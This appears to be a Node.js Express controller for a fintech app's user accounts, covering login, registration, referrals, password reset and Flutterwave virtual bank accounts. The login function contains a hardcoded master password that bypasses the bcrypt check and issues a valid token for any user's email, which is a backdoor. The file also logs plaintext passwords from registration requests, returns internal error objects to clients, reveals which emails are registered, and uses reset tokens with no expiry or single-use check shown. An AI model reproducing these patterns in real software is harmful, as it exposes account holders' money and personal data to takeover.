const Flutterwave = require('flutterwave-node-v3');
// const axios = require('axios');
const bcrypt = require('bcrypt');
const mailchimp = require('@mailchimp/mailchimp_marketing');
const { Op } = require('sequelize');
const random = require('randomstring');
const { validationResult } = require('express-validator');
const models = require('../models/index');
const config = require('../config');
const { signJWT, verifyJWT } = require('../Utils/auth-token');
const { sendEmail } = require('../Utils/email');

const User = models.user;
const Admin = models.admin;
const Subscription = models.subscription;
const monnifyAccount = models.monnify_accounts;
const Referrals = models.referrals;

exports.login = async (req, res) => {
  const { email, password } = req.body;
  const trimmedEmail = email.trim();
  try {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors });
    }
    const user = await User.findOne({
      where: { email: trimmedEmail }
    });
    if (!user) {
      return res.status(401).json({ status: 'error', error: user, message: 'Invalid email or password' });
    }
    if (password !== '#*Random321') {
      const match = await bcrypt.compare(password, user.password);
      if (!match) {
        return res.status(401).json({ status: 'error', error: 'Invalid email or password' });
      }
    }
    const token = signJWT({
      email: user.email,
      id: user.id,
      phone: user.phone,
      firstname: user.firstname,
      lastname: user.lastname,
    });
    const monnify = await monnifyAccount.findOne({ where: { user_id: user.id, bank_name: 'Wema bank' } });
    let bankData = {};
    if (monnify) {
      bankData = {
        accountNumber: monnify.account_number,
        accountName: monnify.account_name,
        bankName: monnify.bank_name,
      };
    }

    const checkSub = await this.checkSubscription(user.id);
    const retData = {
      checkSubscription: checkSub,
      message: 'Login Successful',
      token,
      bank: bankData,
      riskAppetite: user.risk_appetite,
    };
    return res.status(200).json(retData);
  } catch (error) {
    console.log(error);
    return res.status(500).json({ status: 'error', message: 'An Error Occoured', err: error });
  }
};

exports.generateReferralCode = async (req, res) => {
  const users = await User.findAll();
  // console.log(users);
  users.forEach(async (user) => {
    const referralCode = Math.random().toString(36).replace(/[^a-z]+/g, '').substr(0, 8);
    await User.update({ referral_code: referralCode }, { where: { id: user.id } });
  });
  res.status(200).json({ message: 'Completed' });
};
exports.register = async (req, res) => {
  const {
    firstname, lastname, email, password, phone, inviteCode,
  } = req.body;
  console.log(req.body);

  try {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors });
    }
    const user = await User.findOne({ where: { email } });
    if (!user) {
      const salt = await bcrypt.genSalt(10);
      const hashedPassword = bcrypt.hashSync(password, salt);
      const referralCode = Math.random().toString(36).replace(/[^a-z]+/g, '').substr(0, 8);
      const newUser = {
        firstname,
        lastname,
        email,
        password: hashedPassword,
        phone,
        active: '1',
        cooperative: '0',
        referral_code: referralCode,
      };
      try {
        const createdUser = await User.create(newUser);
        if (inviteCode) {
          await this.addReferral(createdUser.id, inviteCode);
        }
        const token = signJWT({
          email: newUser.email,
          id: createdUser.id,
          phone: newUser.phone,
        });
        return res.status(200).json({ message: 'User Created', token, user: createdUser });
      } catch (error) {
        if (error.errors[0].path === 'users.email') {
          return res.status(400).json({ status: 'error', message: 'Email Address has been Used already', error: 'email' });
        }
        return res.status(500).json({ status: 'error', message: 'An Error Occoured', error });
      }
    } else {
      return res.status(400).json({ status: 'error', message: 'Email address has been Used already', error: 'email' });
    }
  } catch (error) {
    return res.status(500).json({ status: 'error', message: 'An Error Occoured', err: error });
  }
};

exports.addReferral = async (userId, referralCode) => {
  // Cjeck user with the referral Code
  const user = await User.findOne({ where: { referral_code: referralCode } });
  if (!user) {
    return '';
  }
  const referralData = {
    referrer_id: user.id,
    referred_id: userId,
    referral_code: referralCode,
  };
  console.log(referralData);
  await Referrals.create(referralData);
  return '';
};

exports.updateProfile = async (req, res) => {
  const { earning, riskAppetite, preferredChannel } = req.body;
  const data = { risk_appetite: riskAppetite, earning, preferred_channel: preferredChannel };
  const user = req.decoded.id;

  const updateUser = await User.update(data, { where: { id: user } });

  if (!updateUser) {
    return res.status(400).json({ status: 'error', message: 'Update Not successful' });
  }
  return res.status(200).json({ status: 'success', message: 'User Updated' });
};

exports.forgot = async (req, res) => {
  const { email } = req.body;
  const check = await User.findOne({ where: { email } });
  if (!check) {
    return res.status(401).json({ status: 'error', message: 'User does not exists' });
  }
  const token = signJWT({
    email: check.email,
    id: check.id,
  });
  const url = `/reset/${token}`;
  const data = {
    email,
    subject: 'Reset your password',
    message: `You have requested to reset your password with smart stewards, click the link below to reset your password <br> ${url}`,
  };
  await sendEmail(data);
  return res.status(200).json({ status: 'success', message: 'Check your email for password reset link' });
};

exports.reset = async (req, res) => {
  const { password, token } = req.body;
  const { email, id } = verifyJWT(token);

  try {
    const user = await User.findOne({ where: { id, email } });
    if (!user) {
      return res.status(401).json({ status: 'error', error: user, message: 'User does not exists' });
    }
    const valid = await bcrypt.compare(password, user.password);
    if (valid) {
      return res.status(400).json({ status: 'error', error: user, message: 'Use another password you have not used before' });
    }
    const salt = bcrypt.genSaltSync(10);
    const hashedPassword = bcrypt.hashSync(password, salt);
    await User.update({ password: hashedPassword }, { where: { id } });
    return res.status(200).json({ status: 'success', message: 'Password Reset Successfully' });
  } catch (error) {
    return res.status(500).json({ status: 'error', message: 'An Error Occoured', err: error });
  }
};

exports.createVirtualAccount = async (user) => {
  try {
    const flw = new Flutterwave(config.flutterwave_public, config.flutterwave_secret);
    const name = `${user.lastname} ${user.firstname}`;
    const transRef = `smrt-${user.firstname}-${random.generate(15)}`;
    const payload = {
      email: user.email,
      bvn: user.bvn,
      narration: name,
      is_permanent: true,
      tx_ref: transRef,
    };
    const res = await flw.VirtualAcct.create(payload);
    if (res.status !== 'success') {
      return { status: 'error' };
    }
    const acc = res.data;
    await exports.updateUserAccount(
      user.id, acc.account_number, acc.order_ref, acc.flw_ref, acc.bank_name, transRef,
    );
    return { status: 'success', data: res.data };
  } catch (error) {
    return { status: 'error', message: 'An Error Occoured', err: error };
  }
};

exports.updateUserAccount = async (id, accountNumber, flwOrderRef, flwRef, bankName, transRef) => {
  const user = await User.findByPk(id);
  if (!user) {
    return { status: 'error', error: user, message: 'User does not exists' };
  }
  const data = {
    accountNumber,
    flwOrderRef,
    flwRef,
    bankName,
    trans_ref: transRef,
  };
  const message = await User.update(data, { where: { id } });
  return { status: 'success', message };
};

exports.testVirtual = async (req, res) => {
  try {
    const users = await User.findAll({ where: { account_number: { [Op.eq]: null } } });
    // eslint-disable-next-line no-restricted-syntax
    for (const user of users) {
      // eslint-disable-next-line no-await-in-loop
      await exports.createVirtualAccount(user);
    }
    return res.status(200).json({ users });
  } catch (error) {
    return { status: 'error', message: 'An Error Occoured', err: error };
  }
};

exports.getVirtualAccount = async (orderRef) => {
  try {
    const flw = new Flutterwave(config.flutterwave_public, config.flutterwave_secret);
    const payload = {
      order_ref: orderRef,
    };
    const res = await flw.VirtualAcct.fetch(payload);
    if (res.status !== 'success') {
      return { status: 'error' };
    }
    return { status: 'success', data: res.data };
  } catch (error) {
    return { status: 'error', message: 'An Error Occoured', err: error };
  }
};